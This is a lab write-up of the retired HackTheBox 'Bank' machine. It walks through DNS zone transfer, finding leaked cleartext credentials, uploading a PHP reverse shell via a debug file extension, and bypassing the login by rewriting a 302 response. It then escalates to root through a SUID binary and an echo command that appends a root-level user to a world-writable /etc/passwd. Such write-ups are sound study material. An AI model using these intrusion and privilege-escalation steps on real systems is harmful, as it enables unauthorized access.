# Bank - Linux, easy (10.10.10.29)

### Nmap scan:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Apache server on port 80 (v: Apache/2.4.7).

```
kali@kali:~/HackTheBox/retired/Linux/easy/Bank$ dig axfr @10.10.10.29 bank.htb

; <<>> DiG 9.18.4-2-Debian <<>> axfr @10.10.10.29 bank.htb
; (1 server found)
;; global options: +cmd
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.		604800	IN	NS	ns.bank.htb.
bank.htb.		604800	IN	A	10.10.10.29
ns.bank.htb.		604800	IN	A	10.10.10.29
www.bank.htb.		604800	IN	CNAME	bank.htb.
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
```

SOA (Start Of Authority) record contains the name of server (bank.htb) and name of administrator of the zone (chris.bank.htb), and version of SOA record (5).

In **/etc/hosts**, insert a line with the various hostnames found thanks to dig: ```10.10.10.29	bank.htb chris.bank.htb ns.bank.htb www.bank.htb```.
Now if we go to http://bank.htb, we are redirected to a login page!

Checking with Burpsuite the requests (trying also SQLi but without success), we can notice that the 302 redirect on the root is pretty huge in terms of size:
```
HTTP/1.1 302 Found
Date: Wed, 17 Aug 2022 19:29:23 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
location: login.php
Content-Length: 7322
Connection: close
Content-Type: text/html
```

The size of the entity body (Content-Lenght), is 7322, while I expected just the redirect with no body.
Checking the response with Burpsuite, we can notice different kind of data:
```
<div class="col-xs-9 text-right">
    <div style="font-size: 30px;"> $</div>
        <div>Balance</div>
    </div>
...
    <th>Card Type</th>
    <th>Card Number</th>
    <th>Card Exp Date</th>
    <th>CVV</th>
    <th>Balance</th>
```

Something that seems related to bank information.

So let's try a scan on http://bank.htb with gobuster `gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o nmap/bank-dirs.txt`.

If we check directory **/balance-transfer** we can see different files with extension **.acc**.
Each file is a report starting with `++OK ENCRYPT SUCCESS`, and then several text fields, where name, email and password are base64 encoded.
But unfortunately, decoding does not provide us credentials.

So, we can try with curl, grep and some regex to analyze these files and try to understand if there's something interesting for us.

With `curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | wc -l` we can notice that there are 999 files.
With `curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | grep -F '2017-06-15' | wc -l` we can notice that each file has been created on the same date (2017-06-15).
So, now check the size of each file `root@kali# curl -s http://bank.htb/balance-transfer/ | grep -F '.acc' | grep -Eo '[a-f0-9]{32}\.acc.*"right">.+ ' | cut -d'>' -f1,7 | tr '">' ' ' | sort -k2 -n | head` and also cleanup the output and sort it by the size:
```
68576f20e9732f1b2edc4df5b8533230.acc  257 
09ed7588d1cd47ffca297cc7dac22c52.acc  581 
941e55bed0cb8052e7015e7133a5b9c7.acc  581 
052a101eac01ccbf5120996cdc60e76d.acc  582 
0d64f03e84187359907569a43c83bddc.acc  582 
10805eead8596309e32a6bfe102f7b2c.acc  582 
20fd5f9690efca3dc465097376b31dd6.acc  582 
346bf50f208571cd9d4c4ec7f8d0b4df.acc  582 
70b43acf0a3e285c423ee9267acaebb2.acc  582 
780a84585b62356360a9495d9ff3a485.acc  582 
```

The first file has the smallest size, let's check it:
```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

Here we can notice that the encryption has failed, and the credentials are stored in clear!
So, now we have the credentials to login the website.

### Obtaining user www-data
The dashboard has links to itself (index.php), as well as Support (support.php) and there's also a logout link.
In support.php we can open tickets and we can notice that it's possible to upload files!

Trying with a simple php reverse shell we are pleased with an error message that notice us that we can only upload images.
There are three ways that a PHP site commonly blocks based on the file type:
1. file extension
2. Content-Type header
3. Mime type (looking at the starting bytes of the content itself and signature)

But also trying with .php.png as extension or changing the starting bytes does not work.

Checking the source code of support.php we can notice the following comment:
```
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
```

So, in order to upload a reverse shell we can simply change the extension to .htb.

### Bypassing Login with an alternative method
The 302 redirects returns a lot of contents as well as we say previously. In Burp, in the Proxy Options, wee can turn on the **Response Interception**.
Now, refreshing bank.htb, we can see that the requests go out and forward it. The response comes back and is intercepted as well.
Changing the "302 Found" to "200 OK" and hitting Forward we can see that the browser now shows **index.php**, through a lot of the formatting is busted, and some of the info is missing compared to what we go previously when logging in.
But support.php is still present and we can still upload our reverse shell.

### www-data to Root
Checking the binaries with Set UID flag active `find / -type f -user root -perm -4000 2>/dev/null` (-type f: only returns files, -perm -4000: files with SUID bit set) will find several files:
```
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

Starting from the first one (/var/htb/bin/emergency) and trying to run it, we can notice that it simply returns a shell, but checking the id we can notice that the effective uid is root:
```
www-data@bank:/$ /var/htb/bin/emergency                           
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

and so we can get the root flag.

### Obtaining root in a different way
Two of the files used to manage user account on a Linux box are **/etc/passwd** and **/etc/shadow**. **passwd** is readable by any user, but **shadow** typically holds the password hashes, and is only readable by root and members of the shadow group. In early versions of Linux, the password hashes were just stored in passwd, but that was determined to be a security risk once people started cracking hashes.

On a normal Linux install, the permissions for these files would look like:
```
root@kali# ls -l /etc/passwd /etc/shadow
-rw-r--r-- 1 root root   3297 Jun 22 16:19 /etc/passwd
-rw-r----- 1 root shadow 1839 Jun 22 16:19 /etc/shadow
```

However, on Bank, someone made passwd writable by anyone:
```
www-data@bank:/$ ls -l /etc/passwd /etc/shadow
-rw-rw-rw- 1 root root   1252 May 28  2017 /etc/passwd
-rw-r----- 1 root shadow  895 Jun 14  2017 /etc/shadow
```

Because passwd once held the hashes, it still can. Typically there’s an **x** where the hash would be, indicating that the hash is actually in shadow. But if I put a hash there, it will work.

I’ll add a user with userid and groupid 0, which makes that user root with a different password.

First I’ll generate a password hash for the password “0xdf” using openssl:
```
www-data@bank:/$ openssl passwd -1 0xdf
$1$q6iY9K5M$eYK1fPmp6OfjbHhWGqZIf0
```

I’ll add a line to /etc/passwd using echo:
```
www-data@bank:/$ echo 'oxdf:$1$q6iY9K5M$eYK1fPmp6OfjbHhWGqZIf0:0:0:pwned:/root:/bin/bash' >> /etc/passwd
```

The format of the line is colon separated username (can’t start with a digit), password hash, user id, group id, comment, home directory, shell.
With the user added, I can just su to that user, which returns as root:
```
www-data@bank:/$ su - oxdf
Password: 
root@bank:~#
```


